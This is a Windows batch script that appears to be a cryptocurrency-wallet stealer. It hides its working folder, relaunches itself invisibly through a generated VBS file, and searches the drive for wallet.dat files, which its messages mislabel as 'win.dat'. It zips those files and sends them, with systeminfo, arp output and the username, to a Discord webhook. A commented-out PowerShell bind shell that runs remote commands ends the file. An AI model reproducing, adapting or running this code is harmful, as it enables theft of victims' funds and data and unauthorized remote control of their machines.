cd %~dp0
mkdir c:\bb
attrib +s +h +x c:\bb

if exist "silent.vbs" goto :silentFound

echo Dim Shell >> silent.vbs
echo Set Shell = CreateObject("WScript.Shell") >> silent.vbs
echo Shell.Run "bb.cmd", 0 >> silent.vbs

start silent.vbs
exit

:silentFound




cd c:\bb

setlocal

:: Set destination folder and zip path
set "DEST_DIR=C:\bb"
set "ZIP_PATH=%DEST_DIR%\collected_win_dat.zip"

:: Create destination directory if it doesn't exist
if not exist "%DEST_DIR%" (
    mkdir "%DEST_DIR%"
)

:: Create temp file list
set "TEMP_LIST=%TEMP%\win_dat_paths.txt"
del "%TEMP_LIST%" >nul 2>&1

echo Searching entire system for win.dat files...
dir C:\wallet.dat /s /b /a:-d 2>nul > "%TEMP_LIST%"

:: PowerShell command to zip files while preserving folder structure
echo Creating zip archive with preserved paths...
powershell -nologo -noprofile -command ^
    "$zipPath = '%ZIP_PATH%';" ^
    "$files = Get-Content -Path '%TEMP_LIST%';" ^
    "Add-Type -A 'System.IO.Compression.FileSystem';" ^
    "$tempDir = [System.IO.Path]::GetTempPath(); $staging = Join-Path $tempDir ([guid]::NewGuid().ToString());" ^
    "mkdir $staging | Out-Null;" ^
    "$files | ForEach-Object {" ^
    "  $source = $_;" ^
    "  $relative = $source.Substring(3); $target = Join-Path $staging $relative;" ^
    "  New-Item -ItemType Directory -Path (Split-Path $target) -Force | Out-Null;" ^
    "  Copy-Item -Path $source -Destination $target -Force -ErrorAction SilentlyContinue;" ^
    "};" ^
    "[IO.Compression.ZipFile]::CreateFromDirectory($staging, $zipPath);" ^
    "Remove-Item -Recurse -Force $staging"

:: Cleanup
del "%TEMP_LIST%" >nul 2>&1

echo Done. Files archived to: %ZIP_PATH%

cd bb
systeminfo > systeminfo.txt
arp -a > arp.txt


for /f "delims=" %b in ('whoami') do set name=%b
curl -F "file=@systeminfo.txt" -F "content=%name%" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
curl -F "file=@arp.txt" -F "content=%name%" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
curl -F "file=@collected_win_dat.zip" -F "content=%name%" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"

:: powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',321099);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();$bytes = New-Object System.Byte[] 1024;$encoding = [System.Text.Encoding]::ASCII;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = $encoding.GetString($bytes, 0, $i);$sendback = (cmd /c "$data" 2>&1 | Out-String );$sendbackBytes = $encoding.GetBytes($sendback);$stream.Write($sendbackBytes, 0, $sendbackBytes.Length);$stream.Flush()};$client.Close();$listener.Stop()"
